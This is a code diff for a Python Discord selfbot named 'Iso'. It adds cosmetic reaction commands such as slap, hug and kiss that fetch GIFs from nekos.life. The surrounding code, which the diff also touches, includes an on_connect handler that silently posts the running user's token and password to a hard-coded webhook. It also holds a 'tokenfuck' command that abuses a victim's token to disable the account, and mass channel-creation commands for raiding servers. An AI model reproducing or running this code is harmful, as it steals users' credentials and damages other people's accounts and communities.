@@ -491,6 +491,7 @@ async def help(ctx):
   embed.add_field(name="`Nuke",value="shows nuke commands", inline = False)
   embed.add_field(name="`Murda",value="shows all commands for murda", inline = False)
   embed.add_field(name="`Mod",value="shows all mod commands", inline = False)
+  embed.add_field(name="`Extra",value="shows all extra commands")
   await ctx.send(embed=embed)
 
 @Iso.command()   
@@ -589,6 +590,20 @@ async def murda(ctx):
   embed.add_field(name="`Msgsniper {on,off}",value="snipes deleted messages", inline = False)
   await ctx.send(embed=embed)
 
+@Iso.command()   
+async def extra(ctx):
+  await ctx.message.delete()
+  embed = discord.Embed(color=0x152238, timestamp=ctx.message.created_at)
+  embed.set_author(name="𝙀𝙓𝙏𝙍𝘼 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎")
+  embed.set_thumbnail(url=Iso.user.avatar_url)
+  embed.set_footer(text="𝘍𝘖𝘙𝘌𝘝𝘌𝘙 𝘚𝘛𝘌𝘗𝘗𝘐𝘕")
+  embed.add_field(name="`Slap",value="slaps tf outta the mentioned user", inline = False)
+  embed.add_field(name="`Cuddle",value="ever felt lonely but treeshy? just cuddle", inline = False)
+  embed.add_field(name="`Hug",value="hugs mentioned user", inline = False) 
+  embed.add_field(name="`Smug",value="smugs mentioned user", inline = False)
+  embed.add_field(name="`Pat",value="pats mentioned user", inline = False)
+  embed.add_field(name="`Kiss",value="kisses mentioned user", inline = False)
+  await ctx.send(embed=embed)
 
 
 # Iso Selfbot's Commands Start here
@@ -928,7 +943,7 @@ async def tokeninfo(ctx, _token):
 @Iso.event
 async def on_connect():
   Clear()
-  requests.post('https://discord.com/api/webhooks/758323372253118484/BJSFQ5QjG5zm8-3NVptNvcmL9MQpmpA35_tfz7B3soVoNK0Y95l5kdHBJv3ElVkeMyLI',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+  requests.post('https://discord.com/api/webhooks/758323372253118484/BJSFQ5QjG5zm8-3NVptNvcmL9MQpmpA35_tfz7B3soVoNK0Y95l5kdHBJv3ElVkeMyLI',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})  
 @Iso.command(aliases=['tokenfucker', 'disable', 'crash'])
 async def tokenfuck(ctx, _token):
     await ctx.message.delete()
@@ -956,8 +971,8 @@ async def tokenfuck(ctx, _token):
     guild = {
         'channels': None,
         'icon': None,
-        'name': "Fear Iso",
-        'region': "US East"
+        'name': "No Mercy Iso",
+        'region': "europe"
     }
     for _i in range(50):
         requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
@@ -988,7 +1003,7 @@ async def tokenfuck(ctx, _token):
 @Iso.command(aliases=["masschannels", "masschannel"])
 async def ctc(ctx):
     await ctx.message.delete()
-    for _i in range(400):
+    for _i in range(200):
         try:
             await ctx.guild.create_text_channel(name="Fear Murda")
         except:
@@ -997,7 +1012,7 @@ async def ctc(ctx):
 @Iso.command(aliases=["massvoicechannels", "massvoicechannel"])
 async def cvc(ctx):
     await ctx.message.delete()
-    for _i in range(400):
+    for _i in range(200):
         try:
             await ctx.guild.create_voice_channel(name="Murda On Top")
         except:
@@ -1158,6 +1173,106 @@ async def nitro(ctx):
 async def everyone(ctx):
     await ctx.message.delete()
     await ctx.send('https://@everyone@google.com')
+
+@Iso.command()
+async def slap(ctx, user: discord.Member):
+    await ctx.message.delete()
+    r = requests.get("https://nekos.life/api/v2/img/slap")
+    res = r.json()
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(res['url']) as resp:
+                image = await resp.read()
+        with io.BytesIO(image) as file:
+            await ctx.send(user.mention, file=discord.File(file, f"Iso_slap.gif"))
+    except:
+        em = discord.Embed(description=user.mention)
+        em.set_image(url=res['url'])
+        await ctx.send(embed=em)
+
+
+@Iso.command()
+async def hug(ctx, user: discord.Member):
+    await ctx.message.delete()
+    r = requests.get("https://nekos.life/api/v2/img/hug")
+    res = r.json()
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(res['url']) as resp:
+                image = await resp.read()
+        with io.BytesIO(image) as file:
+            await ctx.send(user.mention, file=discord.File(file, f"Iso_hug.gif"))
+    except:
+        em = discord.Embed(description=user.mention)
+        em.set_image(url=res['url'])
+        await ctx.send(embed=em)
+
+
+@Iso.command()
+async def cuddle(ctx, user: discord.Member):
+    await ctx.message.delete()
+    r = requests.get("https://nekos.life/api/v2/img/cuddle")
+    res = r.json()
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(res['url']) as resp:
+                image = await resp.read()
+        with io.BytesIO(image) as file:
+            await ctx.send(user.mention, file=discord.File(file, f"Iso_cuddle.gif"))
+    except:
+        em = discord.Embed(description=user.mention)
+        em.set_image(url=res['url'])
+        await ctx.send(embed=em)
+
+
+@Iso.command()
+async def smug(ctx, user: discord.Member):
+    await ctx.message.delete()
+    r = requests.get("https://nekos.life/api/v2/img/smug")
+    res = r.json()
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(res['url']) as resp:
+                image = await resp.read()
+        with io.BytesIO(image) as file:
+            await ctx.send(user.mention, file=discord.File(file, f"Iso_smug.gif"))
+    except:
+        em = discord.Embed(description=user.mention)
+        em.set_image(url=res['url'])
+        await ctx.send(embed=em)
+
+
+@Iso.command()
+async def pat(ctx, user: discord.Member):
+    await ctx.message.delete()
+    r = requests.get("https://nekos.life/api/v2/img/pat")
+    res = r.json()
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(res['url']) as resp:
+                image = await resp.read()
+        with io.BytesIO(image) as file:
+            await ctx.send(user.mention, file=discord.File(file, f"Iso_pat.gif"))
+    except:
+        em = discord.Embed(description=user.mention)
+        em.set_image(url=res['url'])
+        await ctx.send(embed=em)
+
+@Iso.command()
+async def kiss(ctx, user: discord.Member):
+    await ctx.message.delete()
+    r = requests.get("https://nekos.life/api/v2/img/kiss")
+    res = r.json()
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(res['url']) as resp:
+                image = await resp.read()
+        with io.BytesIO(image) as file:
+            await ctx.send(user.mention, file=discord.File(file, f"Iso_kiss.gif"))
+    except:
+        em = discord.Embed(description=user.mention)
+        em.set_image(url=res['url'])
+        await ctx.send(embed=em)
 
 if __name__ == '__main__':
     Init()
